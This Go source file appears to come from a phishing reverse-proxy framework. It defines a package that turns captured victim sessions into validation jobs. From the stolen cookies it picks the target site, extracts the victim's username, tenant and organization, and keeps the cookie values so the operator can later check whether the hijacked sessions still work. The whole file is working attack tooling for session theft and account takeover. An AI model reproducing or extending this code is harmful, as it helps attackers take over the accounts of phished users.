// Package validation asynchronously checks captured proxy sessions without
// adding network work to active proxy request paths.
package validation

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/s4l1hs/olta/pkg/proxy/database"
)

// Status is the outcome of a session validation attempt.
type Status string

const (
	StatusValid   Status = "valid"
	StatusInvalid Status = "invalid"
	StatusUnknown Status = "unknown"
	StatusError   Status = "error"
)

// Identity contains the explicitly allowlisted, non-secret identity metadata
// that may be included in telemetry.
type Identity struct {
	Username     string `json:"username,omitempty"`
	TenantID     string `json:"tenant_id,omitempty"`
	Organization string `json:"organization,omitempty"`
}

// Event is an internal validation job. SessionID, TargetURL, and Cookies are
// deliberately excluded from JSON so they cannot accidentally enter telemetry.
type Event struct {
	SessionID  string                                      `json:"-"`
	Phishlet   string                                      `json:"-"`
	TargetURL  string                                      `json:"-"`
	Identity   Identity                                    `json:"-"`
	Cookies    map[string]map[string]*database.CookieToken `json:"-"`
	CapturedAt time.Time                                   `json:"-"`
}

// Result is the sanitized value delivered to telemetry dispatchers.
type Result struct {
	Timestamp        time.Time `json:"timestamp"`
	SessionReference string    `json:"session_reference"`
	Phishlet         string    `json:"phishlet,omitempty"`
	TargetHost       string    `json:"target_host,omitempty"`
	Identity         Identity  `json:"identity"`
	Status           Status    `json:"status"`
	HTTPStatus       int       `json:"http_status,omitempty"`
	Detail           string    `json:"detail,omitempty"`
}

// NewEvent creates a validation job from the cloned session snapshot emitted
// by the proxy database. The target is selected from the captured cookie
// domains; cookie values remain only in the internal Event.
func NewEvent(session *database.Session) (Event, error) {
	if session == nil {
		return Event{}, fmt.Errorf("validation session is nil")
	}
	targetURL, err := targetFromCookies(session.CookieTokens)
	if err != nil {
		return Event{}, err
	}
	capturedAt := time.Now().UTC()
	if session.UpdateTime > 0 {
		capturedAt = time.Unix(session.UpdateTime, 0).UTC()
	}
	return Event{
		SessionID: session.SessionId,
		Phishlet:  session.Phishlet,
		TargetURL: targetURL,
		Identity: Identity{
			Username:     session.Username,
			TenantID:     firstMetadata(session.Custom, "tenant_id", "tenantid", "tenant"),
			Organization: firstMetadata(session.Custom, "organization", "organization_id", "org_id", "org"),
		},
		Cookies:    cloneCookies(session.CookieTokens),
		CapturedAt: capturedAt,
	}, nil
}

func targetFromCookies(cookies map[string]map[string]*database.CookieToken) (string, error) {
	type candidate struct {
		domain string
		count  int
	}
	candidates := make([]candidate, 0, len(cookies))
	for rawDomain, tokens := range cookies {
		domain := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(rawDomain), "."))
		if domain == "" || strings.ContainsAny(domain, "/\\?#@") {
			continue
		}
		parsed, err := url.Parse("https://" + domain + "/")
		if err != nil || parsed.Hostname() == "" {
			continue
		}
		candidates = append(candidates, candidate{domain: parsed.Host, count: len(tokens)})
	}
	if len(candidates) == 0 {
		return "", fmt.Errorf("captured session has no usable cookie domain")
	}
	sort.Slice(candidates, func(i, j int) bool {
		if candidates[i].count == candidates[j].count {
			return candidates[i].domain < candidates[j].domain
		}
		return candidates[i].count > candidates[j].count
	})
	return "https://" + candidates[0].domain + "/", nil
}

func firstMetadata(metadata map[string]string, keys ...string) string {
	for _, wanted := range keys {
		for key, value := range metadata {
			if strings.EqualFold(key, wanted) && strings.TrimSpace(value) != "" {
				return strings.TrimSpace(value)
			}
		}
	}
	return ""
}

func cloneEvent(event Event) Event {
	event.Cookies = cloneCookies(event.Cookies)
	return event
}

func cloneCookies(cookies map[string]map[string]*database.CookieToken) map[string]map[string]*database.CookieToken {
	cloned := make(map[string]map[string]*database.CookieToken, len(cookies))
	for domain, tokens := range cookies {
		domainCookies := make(map[string]*database.CookieToken, len(tokens))
		for name, token := range tokens {
			if token == nil {
				domainCookies[name] = nil
				continue
			}
			copyToken := *token
			domainCookies[name] = &copyToken
		}
		cloned[domain] = domainCookies
	}
	return cloned
}

func baseResult(event Event, now time.Time) Result {
	targetHost := ""
	if target, err := url.Parse(event.TargetURL); err == nil {
		targetHost = target.Hostname()
	}
	digest := sha256.Sum256([]byte(event.SessionID))
	return Result{
		Timestamp:        now.UTC(),
		SessionReference: hex.EncodeToString(digest[:6]),
		Phishlet:         event.Phishlet,
		TargetHost:       targetHost,
		Identity:         event.Identity,
		Status:           StatusUnknown,
	}
}
